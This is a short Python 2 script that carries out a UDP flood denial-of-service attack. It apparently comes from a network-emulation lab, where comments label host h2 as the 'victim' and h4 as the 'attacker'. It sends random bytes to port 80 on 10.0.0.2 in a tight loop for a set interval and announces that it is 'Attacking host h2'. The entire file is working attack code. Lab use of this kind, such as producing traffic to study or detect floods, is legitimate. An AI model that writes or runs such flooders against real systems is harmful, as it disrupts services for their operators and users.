import socket
import time
import random
import os
#destination Ip can be passed in argv later

#victim: h2
#attacker : h4
dest_ip = "10.0.0.2"

#portNum = 6555
#flood the packets for 60secs
interval  = 2

def floodUdpPackets():
   startT = time.time()

   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   #s.connect((dest_ip,portNum))
   print "Attacking host h2 with UDP FlOODING"  
   while(time.time() - startT < interval):
      #choose a new random port everytime
     ### portNum = random.randint(10,6000)
      portNum = 80
      #print portNum
#      s.connect((dest_ip,portNum))
      #create bytes of data
      data = os.urandom(3)
      s.sendto(data,(dest_ip,portNum))
   s.close()

if __name__ == "__main__":
   floodUdpPackets()


